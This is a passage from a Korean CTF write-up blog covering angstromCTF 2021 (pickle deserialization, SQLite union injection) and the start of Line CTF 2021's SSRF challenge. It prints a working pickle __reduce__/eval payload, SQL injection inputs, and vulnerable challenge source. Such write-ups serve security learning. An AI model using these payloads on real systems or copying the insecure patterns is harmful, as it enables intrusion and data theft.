pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;form method=&quot;post&quot; action=&quot;/add&quot; style=&quot;text-align: center; width: 100%&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;item&quot; placeholder=&quot;Item&quot;&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style=&quot;width: 100%; height: 100%&quot; src=&quot;/pickle.jpg&quot;&gt;&#x27;</span> + \</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;div style=&quot;background-color: white; font-size: 3em; position: absolute; top: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%; left: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%;&quot;&gt;<span class="subst">&#123;item&#125;</span>&lt;/div&gt;&#x27;</span> <span class="keyword">for</span> item <span class="keyword">in</span> items)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">contents = request.cookies.get(<span class="string">&#x27;contents&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line">items.append(request.form[<span class="string">&#x27;item&#x27;</span>])</span><br><span class="line">response = make_response(redirect(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">response.set_cookie(<span class="string">&#x27;contents&#x27;</span>, base64.b64encode(pickle.dumps(items)))</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">app.run(threaded=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>소스 코드를 보면 플래그는 <code>flag</code> 변수에 들어가 있는 것을 볼 수 있습니다. 그리고 index를 보면 <code>contentes</code>라는 쿠키의 값을 가져와서 <code>loads()</code> 함수의 인자 넘겨주기 때문에 역직렬화 취약점이 발생합니다. 그러니 역직렬화 취약점을 이용햇 REC를 트리거해서 템블릿 변수로 <code>flag</code> 변수를 넘겨주면 될 거 같습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exploit</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;&#123;flag&#125;&quot;</span>, ))</span><br><span class="line">print(base64.b64encode(pickle.dumps(exploit())))</span><br><span class="line"><span class="comment"># b&#x27;gANjYnVpbHRpbnMKZXZhbApxAFgGAAAAe2ZsYWd9cQGFcQJScQMu&#x27;</span></span><br></pre></td></tr></table></figure><p>위와 같이 익스 코드를 작성해주었습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Jar/1.png?raw=true"></p><p><code>contentes</code>라는 쿠키의 값으로 위 페이로드를 넘겨주니 플래그를 얻을 수 있었습니다.</p><blockquote><p>FLAG : actf{you_got_yourself_out_of_a_pickle}</p></blockquote><hr><h2 id="Web-Sea-of-Quills-70-pts"><a href="#Web-Sea-of-Quills-70-pts" class="headerlink" title="(Web) Sea of Quills [70 pts]"></a>(Web) Sea of Quills [70 pts]</h2><blockquote><p>Sea of Quills 문제는 SQLite Injection 문제입니다.</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sqlite3&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:bind</span>, <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">set <span class="symbol">:port</span>, <span class="number">4567</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">db = SQLite3::Database.new <span class="string">&quot;quills.db&quot;</span></span><br><span class="line"><span class="variable">@row</span> = db.execute( <span class="string">&quot;select * from quills&quot;</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">erb <span class="symbol">:index</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/quills&#x27;</span> <span class="keyword">do</span></span><br><span class="line">erb <span class="symbol">:quills</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/quills&#x27;</span> <span class="keyword">do</span></span><br><span class="line">db = SQLite3::Database.new <span class="string">&quot;quills.db&quot;</span></span><br><span class="line">cols = params[<span class="symbol">:cols</span>]</span><br><span class="line">lim = params[<span class="symbol">:limit</span>]</span><br><span class="line">off = params[<span class="symbol">:offset</span>]</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;-&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; <span class="params">|word|</span></span><br><span class="line"><span class="keyword">if</span> cols.<span class="keyword">include</span>? word</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;beep boop sqli detected!&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad, no quills for you!&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="variable">@row</span> = db.execute(<span class="string">&quot;select %s from quills limit %s offset %s&quot;</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">p @row</span><br><span class="line"></span><br><span class="line">erb <span class="symbol">:specific</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>문제에서 소스 코드를 제공해주는데 루비인 것을 볼 수 있습니다. 코드를 보면 <code>cols</code>, <code>limit</code>, <code>offset</code>의 값을 가져와서 필터링 검증을 하고, 쿼리문 내에 넣은 후에 <code>execute()</code> 함수르 이용해서 쿼리르 실행하는 것을 볼 수 있습니다.</p><p>여기서 <code>union</code> 키워드를 필터링하지 않아 쿼리를 2개 이상 실행시켜줄 수 있을 거 같습니다. cols에 값을 <code>select</code>와 <code>from</code>에 사이에 넣어주는 것을 볼 수 있는데 만약 <code>sql from sqlite union select &lt;column&gt;</code>을 넣어준다면 SQL Injection을 할 수 있습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/3.png?raw=true"></p><p>요청을 보내보니 <code>cols</code>의 값으로 <code>url</code>, <code>desc</code>, <code>name</code>이 넘어가는 것을 보아 이 3개가 <code>quills</code> 테이블의 존재하는 컬럼인 거 같습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/1.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit  : 1</span><br><span class="line">offset : 0</span><br><span class="line">cols   : sql from sqlite_msater union select url</span><br></pre></td></tr></table></figure><p>위와 같이 보내주니 메타 테이블 <code>sqlite_master</code>를 잘 참조하는 것을 볼 수 있고, 여기서 <code>flagtable</code>라는 테이블에 <code>flag</code>라는 컬럼이 존재하는 것을 알 수 있었습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/2.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit  : 1</span><br><span class="line">offset : 0</span><br><span class="line">cols   : flag from flagtable union select url</span><br></pre></td></tr></table></figure><p>마지막을 위와 같이 <code>flagtable</code> 테이블을 참조하니 플래그가 나오는 것을 볼 수 있었습니다.</p><blockquote><p>FLAG : actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Line CTF 2021 Write Up</title>
      <link href="2021/03/21/2021-03-21-Line-CTF-2021/"/>
      <url>2021/03/21/2021-03-21-Line-CTF-2021/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/images/linectf.png?raw=true"></p><p>The reason I didn’t certify the flag was to yield to a team member I knew. Because you said it would help you write for the company.</p><hr><h2 id="Web-diveinternal-50-pts"><a href="#Web-diveinternal-50-pts" class="headerlink" title=" (Web) diveinternal [50 pts]"></a><span style="color:#21C587"></span> (Web) diveinternal [50 pts]</h2><blockquote><p>diveinternal 문제는 SSRF 취약점을 이용해 플래그를 획득하는 문제입니다.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.env.NODE_ENV == <span class="string">&#x27;local&#x27;</span>) &#123; <span class="comment">//set the environment value before your running this app</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).config();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> target = process.env.TARGET_HOST;</span><br><span class="line"><span class="keyword">var</span> test = process.env.TEST;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  request(&#123;</span><br><span class="line">    headers: req.headers,</span><br><span class="line">    uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/`</span>,</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;apis&#x27;</span> , <span class="attr">data</span>: data.body&#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/coin&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  request(&#123;</span><br><span class="line">        headers: req.headers,</span><br><span class="line">        uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/coin`</span>,</span><br><span class="line">      &#125;).pipe(res);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  router.get(<span class="string">&#x27;/addsub&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    request(&#123;</span><br><span class="line">          </span><br><span class="line">          uri: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/addsub`</span>,</span><br><span class="line">          qs: &#123;</span><br><span class="line">            email: req.query.email,</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).pipe(res);</span><br><span class="line">    &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>위 코드는 <code>api</code>인데 <code>$&#123;target&#125;</code>의 값을 이용해서 요청 보내는 것을 볼 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TEST&#x3D;test</span><br><span class="line">TARGET_HOST&#x3D;localhost:5050</span><br></pre></td></tr></table></figure><p>또한 <code>TARGET_HOST</code>의 값은 로컬호스트인 것을 보아 내부 서버로 요청을 보내는 것을 알 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">FROM node:lts-alpine as base</span><br><span class="line"></span><br><span class="line">ADD .&#x2F;src &#x2F;src</span><br><span class="line">WORKDIR &#x2F;src</span><br><span class="line">COPY &#x2F;src&#x2F;package*.json &#x2F;</span><br><span class="line">EXPOSE 3000</span><br><span class="line"></span><br><span class="line">FROM base as production</span><br><span class="line">ENV NODE_ENV&#x3D;production</span><br><span class="line">ENV TARGET_HOST&#x3D;private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">RUN npm ci</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;node&quot;, &quot;bin&#x2F;www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as dev</span><br><span class="line">ENV NODE_ENV&#x3D;development</span><br><span class="line">ENV DEBUG&#x3D;frontend:*</span><br><span class="line">ENV TARGET_HOST&#x3D;private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin&#x2F;www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as local</span><br><span class="line">ENV NODE_ENV&#x3D;development</span><br><span class="line">ENV DEBUG&#x3D;frontend:*</span><br><span class="line">ENV TARGET_HOST&#x3D;localhost:5050</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . &#x2F;</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin&#x2F;www&quot;]</span><br></pre></td></tr></table></figure><p>도커 파일을 확인해보면 <code>5050</code> 포트만 열려 있는 건 아니고, <code>5000</code>번 포트도 열려 있는 것을 볼 수 있습니다. 즉, 사용할 수 있는 내부 서버는 localhost:5050, localhost:5000 총 2개가 존재합니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunRollbackDB</span>(<span class="params">dbhash</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br></pre></td></tr></table></figure><p>그리고 일단 제일 중요한 플래그를 읽는 조건을 보면 현재 서버의 환경변수가 <code>LOCAL</code>이 아니여야하고, <code>&#39;backup/&#39; + dbahsh</code>라는 파일이 존재한다면 <code>FLAG</code> 파일을 읽고, 반환해주는 것을 볼 수 있습니다. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/coin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coin</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = app.response_class()</span><br><span class="line">        language = LanguageNomarize(request)</span><br><span class="line">        response.headers[<span class="string">&quot;Lang&quot;</span>] =  language</span><br><span class="line">        data = getCoinInfo()</span><br><span class="line">        response.data = json.dumps(data)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br></pre></td></tr></table></figure><p>첫 번째로 <code>api</code> 서버에서 <code>/coin</code>으로 요청을 보내면 <code>LanguageNomarize()</code> 함수의 반환 값을 <code>Lang</code>이라는 헤더에 넣어주고, <code>getCoinInfo()</code> 함수를 이용해서 코인의 정보를 가져와 응답해주는 것을 볼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LanguageNomarize</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;en&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        regex = <span class="string">&#x27;^[!@#$\\/.].*/.*&#x27;</span> <span class="comment"># Easy~~</span></span><br><span class="line">        language = request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        language = re.sub(<span class="string">r&#x27;%00|%0d|%0a|[!@#$^]|\.\./&#x27;</span>, <span class="string">&#x27;&#x27;</span>, language)</span><br><span class="line">        <span class="keyword">if</span> re.search(regex,language):</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = requests.get(request.host_url+language, headers=request.headers)</span><br><span class="line">            <span class="keyword">if</span> data.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> data.text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>LanguageNomarize()</code> 함수를 보면 <code>Lang</code>이라는 헤더가 존재하면 헤더의 값을 정규식으로 검사를 하고, <code>requests.get()</code> 함수를 이용해서 요청을 보내는 것을 볼 수 있습니다. 여기서 <code>request.host_url</code>과 <code>language</code>의 값은 우리가 조작할 수 있기 때문에 원하는 곳으로 요청을 보낼 수 있기 때문에 SSRF 취약점이 발생합니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/integrityStatus&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">integritycheck</span>():</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;db&#x27;</span>:<span class="string">&#x27;database/master.db&#x27;</span>,<span class="string">&#x27;dbhash&#x27;</span>:activity.dbHash&#125;</span><br><span class="line">    data = json.dumps(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>두 번째는 <code>/integrityStatus</code>를 확인해보겠습니다. 해당 경로로는 <code>api</code> 서버와 통신하지 않기 때문에 우리가 일반적으로는 요청을 보낼 수 없습니다. 하지만 SSRF 취약점을 이용하면 <code>/integrityStatus</code>로 요청을 해서 <code>dbhash</code>의 값을 알아낼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rollback&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rollback</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Key&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">        result  = activity.IntegrityCheck(request.headers.get(<span class="string">&#x27;Key&#x27;</span>),request.args.get(<span class="string">&#x27;dbhash&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;error&#x27;</span>]), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>세 번째는 <code>/rollback</code>을 보면 <code>SignCheck()</code>의 값이 참이고, <code>Key</code>라는 헤더 값이 존재하면 <code>IntegrityCheck()</code> 메서드를 호출하는 것을 볼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntegrityCheck</span>(<span class="params">self,key, dbHash</span>):</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.integrityKey == key:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> self.dbHash != dbHash:</span><br><span class="line">        flag = RunRollbackDB(dbHash)</span><br><span class="line">        logger.debug(<span class="string">&#x27;DB File changed!!&#x27;</span>+dbHash)</span><br><span class="line">        file = <span class="built_in">open</span>(os.environ[<span class="string">&#x27;DBFILE&#x27;</span>],<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self.dbHash = hashlib.md5(file).hexdigest()</span><br><span class="line">        self.integrityKey = hashlib.sha512((self.dbHash).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;DB is safe!&quot;</span></span><br></pre></td></tr></table></figure><p><code>IntegrityCheck()</code> 메서드를 보면 <code>self.integrityKey</code>의 값과 <code>Key</code>의 값이 동일하고, <code>self.dbHash</code> 값과 <code>dbHash</code>의 값이 동일 하지 않으면 <code>RunRollbackDB()</code> 함수를 실행시켜 주는 것을 볼 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 